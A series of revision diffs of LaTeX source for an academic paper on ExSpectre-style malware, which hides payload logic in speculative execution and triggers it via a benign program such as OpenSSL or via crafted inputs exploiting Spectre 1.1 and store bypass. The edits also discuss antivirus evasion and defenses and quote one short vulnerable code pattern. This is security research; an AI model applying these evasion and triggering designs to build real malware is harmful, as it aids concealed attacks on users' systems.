+%environment~\cite{lindorfer2011detecting, balzarotti2010efficient,
+%paleari2009fistful} attempting to circumvent malware detectors. To address
+%red-pills, systems often employ measures to detect them.
 
-Unlike red-pills, \speculake complicates analysis and impedes malware detectors
-with the use a trigger program and speculative execution. The use of a separate
-and seemingly benign trigger program influenced by the adversary enables the
-\speculake malware to limit detection by acting benign until triggered to
-influence the branch predictor (while still appearing innocuous).
+\paragraph{Bare Metal}
+Modern malware often uses hardware minutia to identify and fingerprint execution
+environments in order to detect when it is under debugging or
+inspection~\cite{lindorfer2011detecting,balzarotti2010efficient,paleari2009fistful}.
+To prevent such identification, analyzers often employ ``bare metal''
+execution~\cite{kirat2011barebox}, by running the malware on
+dedicated hardware that allows introspection and observation of the system
+without interfering with its normal operation. This prevents malware from using
+so-called ``red pill'' checks to observe that it is under test (and hide its
+malicious behavior)~\cite{kirat2014barecloud}. However, to the best of our
+knowledge, no publicly available bare-metal environments allow introspection on
+the speculative state of the CPU, making it difficult to analyze \speculake
+malware. Such environments would be useful for observing the behavior of
+\speculake malware in the presence of its trigger, but this presumably would not be
+present in such a context.
 
-Additionally, as an \speculake attack is carried out via speculative execution,
-the instructions executed and speculative state are not committed to by the
-processor and are thus obscured from analysts. Similarly, symbolic execution
-will fail to find the speculative gadgets as they are never on the (committed)
-execution pathway.
+Symbolic execution has been used to find
+environmental red pill checks~\cite{schwartz2010all}. However, such analysis
+would be ineffective against \speculake, as symbolic execution does not reason
+about speculative paths and how they might influence a program.
 
-Furthermore, direct analysis such as with break-points (and other
-debugging techniques) will not aid in unravelling \speculake malware as
-break-points interrupt the control flow of a program and prevent speculative
-execution. This allows \speculake to effectively act as a red-pill while
-avoiding detection as such. Suggesting that significant work would be required
-to adapt current red-pill detectors to detect \speculake malware.
+%Unlike red-pills, \speculake complicates analysis and impedes malware detectors
+%with the use a trigger program and speculative execution. The use of a separate
+%and seemingly benign trigger program influenced by the adversary enables the
+%\speculake malware to limit detection by acting benign until triggered to
+%influence the branch predictor (while still appearing innocuous). 
+%
+%Additionally, as an \speculake attack is carried out via speculative execution,
+%the instructions executed and speculative state are not committed to by the
+%processor and are thus obscured from analysts. Similarly, symbolic execution
+%will fail to find the speculative gadgets as they are never on the (committed)
+%execution pathway. 
+%
+
+%Furthermore, direct analysis using break-points (and other
+%debugging techniques) will not aid in unravelling \speculake malware as
+%break-points interrupt the control flow of a program and prevent speculative
+%execution. This allows \speculake to effectively act as a red-pill while
+%avoiding detection as such. Suggesting that significant work would be required
+%to adapt current red-pill detectors to detect \speculake malware.
 
@@
 
+\if0
 \subsubsection{Hardware-level defenses}
@@
 %capabilities.
+\fi
 
-\paragraph{Operating System Defense}
-Hardware could also provide the operating system with a privileged instruction
-that gives it more control over the interaction between programs. For example,
-the OS could use a privileged instruction to copy out the Branch History Buffer
-(BHB) state when it context switches between processes, restoring it when the
-process is restored. This would prevent cross-process interactions with the
-branch predictor, and prevent multi-process \speculake malware. However, it does
-not prevent a single-process \speculake, and it does not fully address the
-Spectre vulnerability.
+%\paragraph{Operating System Defense}
+%Hardware could also provide the operating system with a privileged instruction
+%that gives it more control over the interaction between programs. For example,
+%the OS could use a privileged instruction to copy out the Branch History Buffer
+%(BHB) state when it context switches between processes, restoring it when the
+%process is restored. This would prevent cross-process interactions with the
+%branch predictor, and prevent multi-process \speculake malware. However, it does
+%not prevent a single-process \speculake, and it does not fully address the
+%Spectre vulnerability.
+%
 
@@
 Intel processors. Given the wide-spread nature of the Spectre vulnerability 
-and the ubiquity of cache side-channels we believe that this work can 
-be directly extended to AMD, ARM, and other processors making use of
+and the ubiquity of side-channels, we believe that this work can 
+be directly extended to ARM and other processors making use of
 speculative branch prediction.
@@
 To create further difficulties for an analyst, or to further target the
-execution environment it is possible to have the payload program test a series
+execution environment, it is possible to have the payload program test a series
 of separate jump patterns. Instead of requiring only a single trigger program,
@@
 Alternatively multiple triggers could be used make individual state changes in
-the payload program, and write in data from a local, or (as demonstrated in
-Section~\ref{subsec:openssl}) remote processes. For example, a payload program
-can check a series of three distinct jump patterns corresponding to three
-different triggers. If the first trigger is detected the payload shifts in a 1
-to the state; if the second is detected it shifts in a 0. If the third trigger
-is detected it discontinues listening to the three triggers and executes the
-data shifted into the state.
-This could be a direct form of \speculake using emulation and
-decryption or more traditional malicious behavior. Using this method a payload
+the payload program, and write in data from a local, or (as described in
+Section~\ref{subsec:openssl}) remote processes. For instance, triggers could be
+used to shift in data or an entire program for emulation.
+%For example, a payload program
+%can check a series of three distinct jump patterns corresponding to three
+%different triggers. If the first trigger is detected the payload shifts in a 1
+%to the state; if the second is detected it shifts in a 0. If the third trigger
+%is detected it discontinues listening to the three triggers and executes the
+%data shifted into the state.
+%This could be a direct form of \speculake using emulation and
+%decryption or more traditional malicious behavior. 
+Using this method a payload
 program can be distributed without the encrypted data section all together,
@@
 
-\subsubsection{Benign Triggers}
-We have demonstrated that a using \allowbreak OpenSSL as a benign trigger allows for
-\speculake payloads to be triggered remotely, and discussed the minimum
-requirements for identifying a benign trigger. However, we have not classified
-typical system resources that might be used as benign triggers. This is a
-promising direction for future investigation as various system libraries present
-juicy targets for trigger design. For example, if a sufficient series of jumps
-is found to exist in the TCP stack implemented in the UNIX kernel (i.e. in the
-TCP Checksum library) an attacker could reasonably trigger a \speculake payload
-remotely, from a spoofed IP address. This attack would rely on a payload
-defeating KASLR, however, this has been demonstrated to be
-feasible~\cite{gruss2017kaslr,evtyushkin2016jump}.
+%\subsubsection{Benign Triggers}
+%We have demonstrated that a using \allowbreak OpenSSL as a benign trigger allows for
+%\speculake payloads to be triggered remotely, and discussed the minimum
+%requirements for identifying a benign trigger. However, we have not classified
+%typical system resources that might be used as benign triggers. This is a
+%promising direction for future investigation as various system libraries present
+%juicy targets for trigger design. For example, if a sufficient series of jumps
+%is found to exist in the TCP stack implemented in the UNIX kernel (i.e. in the
+%TCP Checksum library) an attacker could reasonably trigger a \speculake payload
+%remotely, from a spoofed IP address. This attack would rely on a payload
+%defeating KASLR, however, this has been demonstrated to be
+%feasible~\cite{gruss2017kaslr,evtyushkin2016jump}.
 
 %% Approximate Computing 
-\subsubsection{Approximate Computing}
-Approximate Computing prioritizes the computation of quick results that are
-potentially incorrect. This form of computation often leverages some type of
-machine learning to determine how well individual results fit with a crowd of
-approximately computed results. As mentioned in Section~\ref{subsec:impl-turing}
-occasionally values necessary for computation in the speculative world are not
-in cache and thus must be speculated themselves. In this situation error
-correcting codes are useless given that the mistake is not a mutation of the
-correct input, but rather a guess at what the input might be. The mechanisms
-used in approximate computing may be beneficial here, allowing computation to
-run speculatively and have an outer process that is tolerant of errors or
-mis-steps by the speculative world.
+%\subsubsection{Approximate Computing}
+%Approximate Computing prioritizes the computation of quick results that are
+%potentially incorrect. This form of computation often leverages some type of
+%machine learning to determine how well individual results fit with a crowd of
+%approximately computed results. As mentioned in Section~\ref{subsec:impl-turing}
+%occasionally values necessary for computation in the speculative world are not
+%in cache and thus must be speculated themselves. In this situation error
+%correcting codes are useless given that the mistake is not a mutation of the
+%correct input, but rather a guess at what the input might be. The mechanisms
+%used in approximate computing may be beneficial here, allowing computation to
+%run speculatively and have an outer process that is tolerant of errors or
+%mis-steps by the speculative world.
 
@@
 
+% benign malicious programs? Use _just_ openssl to do arbitrary computation
+% speculatively. May not be able to leak arbitrary things, but could be easier
+% to do arbitrary computations. syscalls? probably not...but maybe leak info from
+% existing ones. Kind of a merge of \speculake and Spectre.
+
 %%%%%%%%%%%%%%

### 2018-08-06 paper/discussion.tex
add discussion on defenses

@@
 \subsection{Defenses}
-We now address possible defenses to detecting and reverse engineering malware that uses
-\speculake. 
+We now address possible defenses to detecting and reverse engineering malware
+that uses \speculake.
+
 \subsubsection{Implemented Mitigations}
@@
 vulnerabilities, however, none of these entirely prevent \speculake malware from
-working, as they are generally not designed to protect programs that willingly use
-Spectre against themselves.
+working, as they are generally not designed to protect programs that willingly
+use Spectre against themselves.
 
@@
 %red-pills, systems often employ measures to detect them.
+\paragraph{Anti-Virus Detectors}
+We verified that numerous modern Anti-Virus technologies were unable to detect
+and flag \speculake malware. We examined ClamAV, BitDefender and rkhunter and
+found that they focus on signature and string detection, examining if potential
+malware make library calls, though BitDefender does use their own proprietary
+adaptable unpacker to support detection of ``generic
+unpacking''~\cite{BitDefender}. Modern anti-virus detectors but do not flag
+programs that directly make syscalls or have the capability of making arbitrary
+syscalls. We note that this is the state of modern commercial anti-virus
+technology but does not mean that \speculake is undetectable.
 
@@
 
-%\paragraph{Operating System Defense}
-%Hardware could also provide the operating system with a privileged instruction
-%that gives it more control over the interaction between programs. For example,
-%the OS could use a privileged instruction to copy out the Branch History Buffer
-%(BHB) state when it context switches between processes, restoring it when the
-%process is restored. This would prevent cross-process interactions with the
-%branch predictor, and prevent multi-process \speculake malware. However, it does
-%not prevent a single-process \speculake, and it does not fully address the
-%Spectre vulnerability.
-%
-
-%\subsubsection{Cache Poisoning}
-%As mentioned in Section~\ref{subsubsec:malware} a vital component of \speculake
-%is the ability to perform cache timings. Any mechanism that modifies the cache
-%can affect the success of \speculake-like attacks.
-%
-%Drastic methods such as completely poisoning the cache will hinder this attack
-%while also forcing almost all loads to result in a cache miss, effectively
-%nullifying the point of cache.
-%
-%However, more conservative methods such as randomly loading values into cache
-%can have a negative affect on \speculake-like attacks (causing the cache timing
-%to predict incorrect values) while not having too detrimental of an affect on
-%programs as a whole.
-%
-%In response to this method of defense \speculake-like attacks can modify the
-%number of iterations and confidence thresholds necessary to determine a value.
-%As mentioned in Section~\ref{subsec:impl-turing} our experiments found that it
-%was only necessary to perform 50 iterations of our \texttt{target\_fn} in order
-%to gain 80\% confidence in the value returned. While only 50 iterations are
-%necessary, increasing this value to higher levels can lead to a significantly
-%higher confidence with very little performance detriment (especially in the
-%case of AES decryption).
+\subsubsection{Reverse-engineering triggers}
+Once \speculake malware has been detected analysts attempting to
+reverse-engineer the effect of the malware can take a similar path as to its
+authors. Specifically the task of examining the real-world execution path of the
+malware and comparing this with the indirect and direct jumps conducted by
+potential trigger programs to find a match. We note that while there may be a
+large number of potential trigger programs the real world execution pathway must
+match the malware's very closely in order to influence the malware successfully.
+However this method will not be useful against the speculative store bypass
+version of \speculake, as a secondary trigger program is unnecessary there.
 

### 2018-08-06 paper/triggers.tex
pass on triggers

--- 2018-08-03 paper/triggers.tex
@@
 \emph{communicate} information covertly to the malicious payload program. For
-example, with OpenSSL, the attacker could have a pair of cipher uncommon cipher
-suites, and using one results in communicating a 1-bit, while the other
-communicates a 0-bit to the payload. To receive this, the payload would have to
-do indirect jump patterns corresponding to both cipher suites, with the
+example, with OpenSSL, the attacker could have a pair of uncommon cipher
+suites, where using one results in communicating a 1-bit, while use of the other
+communicates a 0-bit to the payload. To receive data, the payload would have to
+do indirect jump patterns corresponding to OpenSSL code for processing both cipher suites, with the
 corresponding speculative entry points shifting in the appropriate bit. Thus, an
@@
 We observe that communication could also go in the other direction: from
-the payload program back to the remote adversary, also via a benign application
+the payload program back to the remote adversary, also via the benign application
 intermediary. The payload program could influence the performance of the benign
 application, and the adversary could time responses from the benign application
-to receive covert information from the malicious payload.
+to receive covert information from the malicious payload~\cite{netspectre}. This would allow the
+malicious payload to operate \emph{entirely speculatively}, without assistance
+from the real world for keeping state.
 
@@
 While existing fuzzers and symbolic execution tools can discover traditional
-input triggers, we can leverage other Spectre variants...
+input triggers, we can leverage other Spectre variants to obfuscate our triggers.
 
-TODO: Jack
+To do this, we use Specualtive Buffer Overflows (SBO)~\cite{kiriansky2018speculative}
+to redirect control flow
+to a speculative entry point specified by user input.
+We design a payload program that takes arbitrary user input and performs appropriate
+bounds checks to ensure no traditional control flow violations could be exploited.
+However, using the Spectre~1.1 variant, control flow can still be violated speculatively,
+allowing the adversary to force a speculative entry point based entirely off the
+input provided. This allows the trigger to be an input, potentially even
+provided over a network if the payload program accepts network data. Traditional
+symbolic execution and code coverage fuzzers will be unable to discover this trigger input, as
+they do not model the speculative state of the CPU.
+
+%such that evaluated code is safe, however a direct branch can
+%be bypassed speculatively given significant lead up with consistent input 
+%to train the branch predictor (see Figure~\ref{fig:spectre-one}). This allows the input
+%to become the trigger.
+
+To create an SBO-triggered payload program, we make the following code pattern,
+as seen from Kiriansky and Waldspurger's Spectre~1.1
+description~\cite{kiransky2018speculative}:
+\begin{lstlisting}
+    if (y < lenc)
+        c[y] = z;
+\end{lstlisting}
+With user controlled 
+\texttt{y} and \texttt{z} and sporadically uncached \texttt{lenc}, an attacker 
+can \textit{speculatively} overflow array \texttt{c}
+to overwrite a return address (or function pointer, etc) and redirect control
+flow. Note that the bounds check on \texttt{y} will ensure that this program
+will not actually allow a buffer overflow to occur, but the attacker can
+nonetheless use this to influence a speculative entry point based on their
+choice of \texttt{y} and \texttt{z}.
+
+We make use of this pattern in a willing payload such that user input can intentionally
+mistrain the branch predictor by repeatedly sending valid (in-bounds) values of
+\texttt{y} before sending a value that would overflow the bounds of \texttt{c}.
+The speculative entry point is also chosen by the 
+trigger in this scenario as \texttt{z} contains the address of the 
+speculative entry point, allowing the attacker to create a ROP-style speculative 
+execution path through the payload. We describe our implementation of this in
+Section~\ref{tk}.
 
@@
 
-TODO: Jack
+Speculative Store Bypass (SSB) (Spectre variant 4) can similarly be used to
+construct an internal (input-based) trigger using the CPU's speculative
+load-store forwarding~\cite{spec-store-bypass}. In a speculative store bypass,
+the CPU incorrectly speculates that a store will not alias with a future load,
+and uses a stale (wrong) value for the result of the speculative load.
+
+To redirect control flow, a payload program could use a function pointer or
+indirect branch target register as the destination for a speculative store
+bypass, causing the CPU to use a stale value to speculatively determine where it
+would go. The stale value could be controlled by a previous unrelated input,
+allowing an adversary to specify the speculative entry point in a carefully
+crafted data input. While the program never
+executes at this stale address in reality, the CPU will briefly speculatively
+execute there, enabling \speculake payloads. Like the speculative buffer
+overflow, this trigger also allows ROP style chains to execute a series of
+speculative gadgets.
+
+%The speculative primitive is shared by all versions of Spectre as an upper
+%bound on what can be done speculatively. What is required to adapt a spectre 
+%vulnerability into the \speculake technique is an attacker controlled method of 
+%triggering control flow redirection in a willing payload to a speculative entry point.
 

### 2018-08-06 paper/introduction.tex
add paragraph about trigger inputs to intro

@@
 harder job and must identify both.
+
 Moreover, it is possible that the trigger program be a
 seemingly-unrelated benign program already on the victim's computer. We
-investigate using the OpenSSL library as a benign trigger
+show this using the OpenSSL library as a benign trigger
 program in Section~\ref{subsec:openssl}. If the trigger program is another benign
@@
 ultimately call the hidden speculative gadget.
+
+We also show it is possible to obviate the trigger program entirely, and
+instead use \emph{trigger inputs}, which are attacker-provided data inputs to
+the payload that cause the CPU to speculatively execute
+at the attacker's chosen address. Unlike traditional malware input triggers, these inputs
+cannot be inferred from the payload binary using static analysis or symbolic
+execution, as the logic these triggers activate happens speculatively in the
+CPU, which existing analysis tools do not model. We describe this technique in
+more detail in Section~\ref{subsec:spec-buffer-overflow}.
 

### 2018-08-06 paper/introduction.tex
rework intro

--- 2018-08-02 paper/introduction.tex
@@
 
+\FigHighLevel
+
 At a high level, \speculake consists of two parts: a payload program, and a
-trigger program. When run by itself, the payload program executes a pattern of
-indirect jumps and measures a cache-based side channel\footnote{We note that other
-side channels could be used in place of a cache}. While the trigger program is
-not running, the payload program is effectively inactive (potentially performing
-a decoy operation). When the trigger program runs, it executes a similar
-pattern of indirect jumps (with similar source and destination addresses as the
-payload program), effectively training the CPU's branch predictor to the jump
-pattern performed by the trigger program.
+trigger. The trigger can take the form of a special input (as in typical
+malware), or an unrelated program running on the same system. When run without
+the trigger, the payload program executes a series of benign operations, and
+measures a cache-based side channel\footnote{We note that other side channels
+could be used in place of a cache}. Once the trigger activates---either
+by the attacker providing specially crafted input, or the trigger program running---it causes
+the CPU to briefly \emph{speculatively} execute from a new target location inside the
+payload program.
 
-Importantly, the trigger program and payload program's indirect jump patterns
-diverge on the destination of their final jumps. However, because the trigger
-program has trained the CPU's branch predictor, the CPU speculates that the
-payload program will continue following the pattern of the trigger program,
-causing it to execute a \emph{speculative gadget} in the payload
-program. This execution path is shown in Figure~\ref{fig:high-level}.
+This target location can be in a region that is neither read
+nor executed normally by the payload program, making this logic effectively dead code to
+any static or dynamic reachability analysis. After the CPU discovers the
+mis-speculation at the target location, it will discard the results and continue
+executing from the correct destination. However, this still gives the payload program a
+limited speculative window where it can perform arbitrary computation, and can
+communicate results back to the ``real world'' via a side
+channel. Figure~\ref{fig:high-level} shows the variant of \speculake that uses a
+trigger program to mis-train the CPU's indirect branch predictor, causing the
+payload program to briefly speculatively execute a hidden target function.
 
-We emphasize that this gadget is in a region that is neither
-read nor executed by the payload program, and after the CPU discovers the
-mis-speculation in the payload program, it will discard the results from the
-speculative gadget and continue executing from the correct destination. However,
-the payload program has a limited speculative window where it can perform
-computation, and can communicate results back to the ``real world'' payload 
-program via a side channel.
+%At a high level, \speculake consists of two parts: a payload program, and a
+%trigger program. When run by itself, the payload program executes a pattern of
+%indirect jumps and measures a cache-based side channel\footnote{We note that other
+%side channels could be used in place of a cache}. While the trigger program is
+%not running, the payload program is effectively inactive (potentially performing
+%a decoy operation). When the trigger program runs, it executes a similar
+%pattern of indirect jumps (with similar source and destination addresses as the
+%payload program), effectively training the CPU's branch predictor to the jump
+%pattern performed by the trigger program.
+%
+%Importantly, the trigger program and payload program's indirect jump patterns
+%diverge on the destination of their final jumps. However, because the trigger
+%program has trained the CPU's branch predictor, the CPU speculates that the
+%payload program will continue following the pattern of the trigger program,
+%causing it to execute a \emph{speculative gadget} in the payload
+%program. This execution path is shown in Figure~\ref{fig:high-level}.
+%
+%We emphasize that this gadget is in a region that is neither
+%read nor executed by the payload program, and after the CPU discovers the
+%mis-speculation in the payload program, it will discard the results from the
+%speculative gadget and continue executing from the correct destination. However,
+%the payload program has a limited speculative window where it can perform
+%computation, and can communicate results back to the ``real world'' payload 
+%program via a side channel.
 
@@
 
-\FigHighLevel
+%While it's possible for the trigger and payload programs to be bundled in a
+%single program, an analyst aware of \speculake could easily find the speculative
+%gadget in the payload program based on the jump pattern in the trigger program.
+%However, if the trigger and payload are kept separate, the analyst has a much
+%harder job and must identify both.
 
-While it's possible for the trigger and payload programs to be bundled in a
-single program, an analyst aware of \speculake could easily find the speculative
-gadget in the payload program based on the jump pattern in the trigger program.
-However, if the trigger and payload are kept separate, the analyst has a much
-harder job and must identify both.
-Moreover, it is possible that the trigger program be a
-seemingly-unrelated benign program already on the victim's computer. We
-investigate using the OpenSSL library as a benign trigger
-program in Section~\ref{subsec:openssl}. If the trigger program is another benign
-program on the system, the analyst has the difficult task of identifying which
-program, library, or even operating system component is responsible for training
-the CPU's branch predictor, and finding the specific set of jumps that occur at
-runtime. To make matters worse, the payload program can include dummy jump
-patterns that are effectively dead ends for the analyst, as they do not
-ultimately call the hidden speculative gadget.
+It is also possible that a trigger program be a
+\emph{benign} program already on the victim's computer. We
+show this using the OpenSSL library as a benign trigger
+program in Section~\ref{subsec:openssl}, activating a malicious payload program
+when an adversary connects to the infected OpenSSL server using a
+TLS connection with a specific cipher suite.
+
+%If the trigger program is another benign
+%program on the system, the analyst has the difficult task of identifying which
+%program, library, or even operating system component is responsible for training
+%the CPU's branch predictor, and finding the specific set of jumps that occur at
+%runtime. To make matters worse, the payload program can include dummy jump
+%patterns that are effectively dead ends for the analyst, as they do not
+%ultimately call the hidden speculative gadget.
+
+We also show it is possible to obviate the trigger program entirely, and
+instead use \emph{trigger inputs}, which are data inputs the attacker provides
+directly to
+the payload, causing the CPU to speculatively execute
+at the attacker's chosen address. Unlike traditional malware input triggers, these inputs
+cannot be inferred from the payload binary using static analysis or symbolic
+execution, as the logic these triggers activate happen speculatively in the
+CPU, which existing analysis tools do not model. We describe this technique in
+more detail in Section~\ref{subsec:spec-buffer-overflow}.
 
@@
 capture all potential \speculake variants. Second, the analyst must run all
-potential trigger programs through the simulator, including benign programs with
-real-world inputs. Both of these contribute to a time-consuming and expensive
+potential trigger programs or inputs through the simulator, including benign
+programs with real-world inputs. Both of these contribute to a time-consuming and expensive
 endeavor for would-be analysts, giving the attacker a significant advantage.
@@
 In order to study the potential of \speculake, we implement several example
-payload programs and evaluate their performance. We find that the speculative
-window is limited by the reorder buffer and physical register file sizes, which
+payload programs and triggers variants, and evaluate their performance. We find
+that the payload program's speculative
+window is mainly limited by the CPU's reorder buffer, which
 allows us to execute between 100 and 200 instructions speculatively on modern
@@
 architecture that fits within the constraints of speculative execution, and show
-the ability to perform AES decryption of a text block via AES encrypt/decrypt
-instructions.
+the ability to perform AES decryption using AES-NI instructions.
 
@@
 reasonable time, ultimately launching a dial-back TCP shell in just over
-2~milliseconds after the trigger program starts.
+2~milliseconds after the trigger is present.
 

### 2018-08-07 paper/figures.tex
captions pass

--- 2018-06-21 paper/figures.tex
@@
     \caption{\textbf{\speculake}\,---\,%
-    Both the Trigger and Payload binaries exhibit the same initial series of
-    indirect jumps, shown in Step 1. The trigger program solely executes these
+    Both the trigger and payload binaries exhibit the same initial series of
+    indirect jumps (Step 1). The trigger program solely executes these
     jumps to (mis)train the branch predictor. In the Payload program
     \texttt{fn\_ptr} has been set to point to the \texttt{cache\_timing}
-    function and flushed from cache. Thus at Step 2 the branch predictor
+    function and flushed from cache. Thus the branch predictor
     mis-predicts the jump to \texttt{cache\_timing} and instead jumps to
-    \texttt{target\_fn} as trained by the Trigger program (green line). 
-    \texttt{target\_fn} then executes speculatively as shown in Step 3. 
-    Eventually \texttt{fn\_ptr} is loaded from memory and this mis-jump is 
-    recognized by the processor, directing computation to Step 4, the 
-    \texttt{cache\_timing} function, which then computes which value was loaded 
-    into cache speculatively.}
-
+    \texttt{target\_fn} (Step 2) as trained by the trigger program (green line). 
+    \texttt{target\_fn} then executes speculatively (Step 3), until
+    \texttt{fn\_ptr} is loaded from memory and the processor redirects
+    computation to the \texttt{cache\_timing} function (Step 4),
+    which measures which value was speculatively loaded into cache.}
     \label{fig:high-level}
 
+\end{figure}
+}
+
+\newcommand{\FigSpectreOne}{
+\begin{figure}[t]
+    \centering
+    \includegraphics[width=0.9\linewidth]{figures/spectre_1_training.png}
+    \caption{\textbf{Speculative buffer overflow warm-up}\,---\, %
+    The direct branch predictor must
+    be trained to expect that a branch will go a specific way before speculative
+    buffer overflows can be used. We varied the number of times a branch was trained
+    to be taken and observed the fraction of times we achieved a speculative buffer overflow
+    execution immediately after (measured by observing if a speculatively-loaded value was present
+    in cache avgeraged over 20,000 trials). We find that a branch must be trained in a
+    direction at least 200 times before it can start to be used in a speculative buffer overflow.}
+    \label{fig:spectre-one}
+\end{figure}
+}
+
+\newcommand{\FigSpecMeasureNP}{
+\begin{figure*}[t]
+     \centering
+        \includegraphics[width=0.9\textwidth]{figures/Speculative_measurements_no-parity.png}
+        \caption{\textbf{Speculative limits}\,---\, %
+    To find the number of instructions we can execute speculatively, we placed a speculative load
+    after an increasing number of instructions, and measured the fraction of times the load
+    was subsequently in cache. We find that we can execute up to 220 instructions speculatively,
+    which corresponds with the size of the CPU's reorder buffer (ROB). However, more complex instructions
+    have stricter constraints, generally corresponding to the number of $\mu$-ops that an instruction
+    comprises.}
+    \label{fig:spec-capacity-np}
+\end{figure*}
+}
+
+\newcommand{\FigSpecMeasureParity}{
+\begin{figure}[b]
+     \centering
+        \includegraphics[width=1.05\linewidth]{figures/Speculative_measurements_parity.png}
+        \caption{\textbf{Hyperthreading}\,---\, %
+        The trigger program influences the payload program via the indirect branch predictor
+        when running on the same logical CPU core. Hyperthreads also share an indirect branch
+        predictor despite running on different logical cores. We measured the impact of
+        same logical core (warm colors) vs paritiy hyperthreads (cool colors, denoted by (P))
+        on the size of the speculative execution window. As hyperthreads run concurrently, they do not
+        need to wait for an OS context switch between processes, but the two processes directly
+        contend for ROB entries. As a result, we find that hyperthreads generally have a smaller
+        speculative execution window.}
+    \label{fig:spec-capacity-parity}
 \end{figure}
@@
     \includegraphics[width=0.5\textwidth]{figures/cache_miss_dist}
-    \caption{The Cache Hit/Miss Latency Distribution of an Intel
-        Xeon-1270. Measured by timing accesses to cached/uncached memory. 
-        Typical cache miss resolution takes 6x longer than a cache hit.}
+    \caption{\textbf{Cache latency}\,---\,%
+        Cumulative distribution function of the cache hit and miss latency
+        for an Intel Xeon-1270 and AMD Epyc 7251. If a cache miss is used
+        to force CPU speculation, the CPU must wait at least 300-800 cycles
+        before the speculated branch can be resolved. However, we find the CPU
+        can execute far fewer instructions speculatively, suggesting another
+        limit is at play.}
     \label{fig:cache-miss}
@@
         \includegraphics[width=0.4\textwidth]{figures/general_model.pdf}
-    \caption{General model of speculative computation within the Payload 
-        process when triggered. \textit{Speculative Computation} has read-only
-        access to all memory within the process, and returns a result via a
-        cache side channel (via the \texttt{probe\_array}).
+        \caption{\textbf{ExSpectre model}\,---\, %
+        General model of speculative computation within the payload 
+        process when triggered. The \textit{Speculative Gadget} has read-only
+        access to all memory within the process, but can return updates/results via a
+        cache side channel (via access to the \texttt{probe\_array}).
         The process can subsequently make
         \textit{Resultant Computations} based on the value returned from
-        the cache side channel to update the state of the process. }
+        the cache side channel to update the state of the \textit{Real World} process.}
     \label{fig:general_model}
@@
         \includegraphics[width=0.5\textwidth]{figures/Speculative_bandwidth}
-    \caption{Speculative Bandwidth---Using the speculative primitive 1KB of data
+        \caption{\textbf{Speculative Bandwidth}\,---\, %
+        Using the speculative primitive, 1KB of data
         can be decrypted and exfiltrated at a speed between 5 and 6 kbps from
@@
         correctness.  Varying the width of the channel results in competing
-        performance factors -- decreasing the number of loops vs decreased size
-        of the probe space.}
+        performance factors, with an optimal throughput achieved at 8~bits.}
     \label{fig:spec_bandwidth}
@@
         \includegraphics[width=0.46\textwidth]{figures/spasm_model.pdf}
-    \caption{This diagram demonstrates the control flow of a \speculake
-        application making use of the decryption gadget and emulation. An
-        encrypted SPASM binary stored in dead code or data accessible to
-        \textit{Speculative Computation} is decrypted  and then returned through
-        the primitive. The \textit{Resultant Computation} performs the SPASM
-        emulation to update the process state before the next instruction is
-        decrypted.}
+        \caption{\textbf{SPASM model}\,---\, %
+        Our SPASM emulator speculatively decrypts intructions, and emulates
+        them in the real world. The \textit{Speculative Computation} decrypts
+        the encrypted SPASM binary, returning the result through the side channel
+        to allow the \textit{Resultant Computation} to update the emulated state
+        (or make system calls) on behalf of the speculative world.}
     \label{fig:spasm_model}

### 2018-08-07 paper/discussion.tex
rearranged discussion.

@@
 \section{Discussion}
+
+\if0
+%Cutting this for now. We sort of cover it in the Turing section(s)
 
@@
 %speculatively executing program.
-%
-\subsubsection{Spectre Versions}
-In this work we have implemented applications making use of the speculative
-primitive in Spectre version 2, however the speculative primitive is not 
-unique to this varaint. The \speculake model can be applied more broadly
-across the spectrum of speculative functionality to hide malicious computation.
 
-For example an attacker could construct a series of direct branches with 
-contradictory conditions such that the resulting code section can never 
-be on a real world execution path. This, however does not prevent such a path
-from occuring speculatively. An attacker could use such an impossible path to
-hide speculative logic that influences the malware, effectively obscuring the
-speculative entry point.
-Similarly, the speculative store bypass variant~\cite{spec-store-bypass} could be used to
-redirect control flow when the mis-speculated load is that of an indirect
-branch target or function pointer.
-
-% we demonstrated this, hopefully
-%Alternatively, recent variants of Spectre version 1 could be used to
-%redirect control flow in speculative overflow style attacks~\cite{kiriansky2018speculative}. 
-%Using this technique speculative gadgets could be executed
-%based on attacker controlled input.
-
-%Again the speculative primitive could 
-%be employed to execute speculative gadgets.
-
-%These alternatives create an even larger attack area for a potential 
-%reverse engineer as the attacker can pivot between them with minimal alterations.
-
-\if0
-%Cutting this for now. We sort of cover it in the Turing section(s)
 \subsubsection{Gadget Location}
@@
 %into the execution pipeline.
-
-\subsubsection{Hypervisors}
-For virtual environments that provide guests significant periods of access to
-hardware resources, \speculake is viable in certain configurations. 
-This result is specific to Spectre 2 variant, as it relies on 
-the indirect branch predictor effecting the branches in either the host 
-or guest environment. We have found that the hypercall context switch from 
-guest to host is light enough that a trigger program running in a guest
-can effect the branch predictor in a host on the same CPU core. This is not
-true in the opposite direction (where the trigger runs on the host) as the 
-hypercall transition seems to be more substantial. This implies, and we have verified,
-that guest-to-guest indirect branch predictor interference, and the current
-\speculake implementation, will not work across disparate virtual environments.
 
@@
 
+\subsubsection{Hypervisors}
+For virtual environments that provide guests significant periods of access to
+hardware resources, \speculake is viable in certain configurations. 
+This result is specific to Spectre 2 variant, as it relies on 
+the indirect branch predictor effecting the branches in either the host 
+or guest environment. We have found that the hypercall context switch from 
+guest to host is light enough that a trigger program running in a guest
+can effect the branch predictor in a host on the same CPU core. This is not
+true in the opposite direction (where the trigger runs on the host) as the 
+hypercall transition seems to be more substantial. While this implies 
+that guest-to-guest indirect branch predictor interference, and the current
+\speculake implementation, will not work across disparate virtual environments,
+strict resource isolation gives a stronger guarantee of non-interference.
+
 \subsubsection{Alternative Applications}

### 2018-08-07 paper/discussion.tex
discussion pass

@@
 program to ensure that earlier code's behavior does not effect its branch prediction.
-IBPB requires CPU and operating system support. However, we observe that
+IBPB requires CPU and operating system support. However, we observe on Linux that
 processes running under the same user group do not receive IBPB protection,
@@
 
-Finally, \speculake could also use another side channel method that
+\speculake could also use another side channel method that
 avoids the cache
@@
 predictor itself~\cite{evtyushkin2018branchscope}, memory bandwidth, power
-utilization, or contention over other shared resources. While cache 
+utilization, or contention over other shared resources~\cite{kiriansky2018speculative}.
+While cache 
 channels tend to have the highest throughput, they are not the only 
@@
 \paragraph{Anti-Virus Detectors}
-We verified that numerous modern Anti-Virus technologies were unable to detect
-and flag \speculake malware. We examined ClamAV, BitDefender and rkhunter and
-found that they focus on signature and string detection, examining if potential
-malware make library calls, though BitDefender does use their own proprietary
-adaptable unpacker to support detection of ``generic
-unpacking''~\cite{BitDefender}. Modern anti-virus detectors but do not flag
